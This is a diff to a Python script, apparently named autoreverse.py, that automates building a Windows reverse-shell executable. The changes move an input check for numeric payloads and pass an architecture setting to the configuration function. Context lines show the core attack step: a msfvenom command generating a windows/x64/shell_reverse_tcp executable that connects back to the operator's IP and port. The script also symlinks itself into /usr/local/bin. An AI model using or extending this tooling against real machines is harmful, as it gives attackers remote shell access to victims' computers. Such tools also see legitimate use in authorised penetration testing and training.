@@ -21,6 +21,10 @@ ActualPath = os.popen('pwd').read().replace('\n', '')
 
 payload = args.payload.lower()
 
+if payload.isnumeric():
+    print(red('The payload must be a string.'))
+    exit()
+
 arch = str(args.architecture).lower()
 
 try:
@@ -70,9 +74,6 @@ def Check_files(file):
         print(blue(file) + green(' downloaded.\n'))
 
 def Configure(IP = Get_IP(), PORT = str(args.port), msf = False, arch='64'):
-    if payload.isnumeric():
-        print(red('The payload must be a string.'))
-        exit()
     
     msfvenom = 'msfvenom -p windows/x64/shell_reverse_tcp LHOST=' + str(IP) + ' LPORT=' + str(PORT) + ' -f exe > autoreverse.exe 2>/dev/null'
 
@@ -155,4 +156,7 @@ if args.listener != None:
 if os.path.exists('/usr/local/bin/autoreverse.py') == False:
     os.system('ln -s ' + ActualPath + '/autoreverse.py /usr/local/bin/autoreverse.py')
 
-Configure()
+if arch == 'none':
+    Configure()
+else:
+    Configure(arch = arch)
